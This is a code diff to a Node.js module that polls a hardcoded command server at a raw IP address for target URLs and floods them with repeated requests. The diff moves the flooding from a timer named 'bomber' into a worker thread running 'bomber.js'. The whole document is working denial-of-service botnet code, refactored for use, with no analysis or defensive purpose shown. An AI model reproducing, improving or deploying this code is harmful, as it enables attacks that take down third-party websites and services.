@@ -1,7 +1,6 @@
 const os = require('os');
+const { Worker } =      require('worker_threads');
 const fetch = require('isomorphic-fetch');
-const randomUseragent = require('random-useragent');
-const request = require('request');
 
 const RANDOM_INTERVAL = Math.floor(Math.random() * 60000) + 30000;
 
@@ -16,26 +15,23 @@ module.exports = async () => {
         } })
     });
 
-    let bomber = setInterval(() => {});
+    let worker;
 
 
     setInterval(async () => {
         try {
             const response = await fetch('http://212.111.203.181/api/v1/targets');
-            const body = await response.json();
+            const { data : { urls } } = await response.json();
 
-            if (body.data.urls.length > 0) {
-                clearInterval(bomber);
-                bomber = setInterval(() => {
-                    body.data.urls.forEach((url) => {
-                        request({
-                            url,
-                            method  : 'GET',
-                            headers : {
-                                'User-Agent' : randomUseragent.getRandom()
-                            }
-                        });
-                    });
+            if (worker) await worker.terminate();
+
+            if (urls.length > 0) {
+                // eslint-disable-next-line require-atomic-updates
+                worker = new Worker(
+                    `${__dirname}/bomber.js`,
+                    { workerData: { urls } }
+                ).on('message', ({ url, success }) => {
+                    console.log(url, success);
                 });
             }
         } catch (err) {
